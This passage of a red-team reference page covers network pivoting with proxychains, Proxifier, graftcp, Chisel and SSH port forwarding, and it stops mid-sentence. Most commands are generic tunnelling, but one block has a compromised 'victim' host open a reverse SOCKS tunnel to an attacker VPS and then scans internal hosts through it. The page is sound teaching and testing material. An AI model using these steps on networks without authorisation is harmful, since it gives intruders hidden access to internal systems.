# Network Pivoting Techniques - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/

Network Pivoting Techniques - Internal All The Things

### SOCKS Compatibility Table

| SOCKS Version | TCP | UDP | IPv4 | IPv6 | Hostname |
| --- | --- | --- | --- | --- | --- |
| SOCKS v4 | ✅ | ❌ | ✅ | ❌ | ❌ |
| SOCKS v4a | ✅ | ❌ | ✅ | ❌ | ✅ |
| SOCKS v5 | ✅ | ✅ | ✅ | ✅ | ✅ |

#### Proxychains

- rofl0r/proxychains-ng - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.
- haad/proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.

Edit the configuration file `/etc/proxychains.conf` to add the SOCKS proxies.

```
[ProxyList]
# socks4 localhost 8080
socks5 localhost 8081

```

Uncomment `proxy_dns` to also proxify DNS requests.

```
proxychains nmap -sT 10.10.10.10
proxychains curl http://10.10.10.10

```

#### Proxifier

Proxifier allows network applications that do not support working through proxy servers to operate through a SOCKS or HTTPS proxy and chains.

- proxifier - The Most Advanced Proxy Client

Open Proxifier, go to Profile -> Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your SOCKS proxy.

Go to Profile -> Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule.

#### Graftcp

- hmgle/graftcp - A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.

 Same as proxychains, with another mechanism to "proxify" which allow Go applications.

```
# Create a SOCKS5, using Chisel or another tool and forward it through SSH
(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# Run graftcp and specify the SOCKS5
(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(attacker) $ graftcp ./nuclei -u http://10.10.10.10

```

Simple configuration file for graftcp: example-graftcp-local.conf

```
## Listen address (default ":2233")
listen = :2233
loglevel = 1

## SOCKS5 address (default "127.0.0.1:1080")
socks5 = 127.0.0.1:1080
# socks5_username = SOCKS5USERNAME
# socks5_password = SOCKS5PASSWORD

## Set the mode for select a proxy (default "auto")
select_proxy_mode = auto

```

### SSH (native)

| Pivoting Technique | Command |
| --- | --- |
| Local Port Forwarding | `ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]` |
| Remote Port Forwarding | `ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]` |
| Socks Proxy | `ssh -N -f -D listenport [user]@[host]` |

Inside an already established SSH session, press `~C` to opens an i